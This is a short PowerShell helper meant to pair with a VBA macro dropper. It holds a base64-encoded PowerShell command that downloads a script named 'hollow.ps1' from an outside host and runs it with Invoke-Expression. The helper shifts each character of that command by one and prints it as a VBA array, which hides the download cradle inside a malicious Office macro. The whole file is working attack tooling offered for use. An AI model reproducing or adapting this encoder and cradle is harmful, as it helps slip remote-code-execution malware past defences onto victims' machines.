<#
    Basic encoder to be used with ps_dropper.vba
#>
$input = "powershell /enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA3AC8AaABvAGwAbABvAHcALgBwAHMAMQAiACkAfABpAGUAeAA=";

$store = @()
$input.ToCharArray() | ForEach-Object { 
    $store += [int][char]$_ + 1
}

Write-Host "Array($($store -join ','))"